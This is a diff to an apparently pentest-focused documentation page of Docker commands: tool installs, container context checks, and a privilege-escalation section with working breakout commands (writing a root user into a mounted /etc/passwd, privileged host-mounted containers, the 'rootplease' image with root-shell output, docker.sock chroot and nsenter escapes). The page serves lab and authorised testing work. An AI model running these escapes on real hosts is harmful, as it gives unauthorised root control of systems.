@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=docker) · [All tools](/index)
+
 **Requires:** Permission to access the selected Docker daemon. Check the context before interpreting its host or containers.
 
 ## Inspect the current daemon
@@ -34,9 +36,130 @@ Check mounts, capabilities, namespaces, and privileged status in context; root i
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=docker)
+## Notebook recipes
 
-## Learning and original examples
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Container and Docker checks](/field/containers)
-- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+<AccordionGroup>
+
+<Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+
+**BloodHound: Full Reference**
+
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+
+</Accordion>
+
+<Accordion title="If a Docker daemon is accessible">
+
+### If a Docker daemon is accessible
+
+**Container and Docker checks**
+
+```bash
+docker context show
+docker ps
+docker inspect CONTAINER_NAME
+```
+
+</Accordion>
+
+<Accordion title="Linux shell — inspect context">
+
+### Linux shell — inspect context
+
+**Container and Docker checks**
+
+```bash
+id
+cat /proc/1/cgroup
+ls -l /.dockerenv /var/run/docker.sock
+cat /proc/self/status | grep -E 'Cap|Seccomp'
+```
+
+</Accordion>
+
+<Accordion title="Docker">
+
+### Docker
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+$> docker run -it --rm -v $PWD:/mnt bash
+$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+latest: Pulling from chrisfosterelli/rootplease
+2de59b831a23: Pull complete 
+354c3661655e: Pull complete 
+91930878a2d7: Pull complete 
+a3ed95caeb02: Pull complete 
+489b110c54dc: Pull complete 
+Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+Status: Downloaded newer image for chrisfosterelli/rootplease:latest
+
+You should now have a root shell on the host OS
+Press Ctrl-D to exit the docker instance / shell
+
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
+</Accordion>
+
+<Accordion title="Docker Install (Greenbone Community Edition)">
+
+### Docker Install (Greenbone Community Edition)
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+mkdir -p ~/greenbone && cd ~/greenbone
+curl -f -O -L https://greenbone.github.io/docs/latest/_static/compose.yaml
+sudo docker compose up -d
+# Access at https://localhost:9392 — admin/admin
+```
+
+</Accordion>
+
+<Accordion title="Active Directory Attack Path: Worked Lab">
+
+### Active Directory Attack Path: Worked Lab
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Most commands here were run during the actual engagement, but  tool flags drift between versions  — this very box hit  xfreerdp  vs  xfreerdp3 ,  bloodyAD add dsync  vs  add dcsync , and  docker compose  vs  docker-compose . Treat each command as a  strong starting point : confirm syntax with  -h / --help  the first time on a new box, and  correct this note as you go  so it becomes your verified source of truth.
+
+```text
+docker compose
+```
+
+</Accordion>
+
+</AccordionGroup>
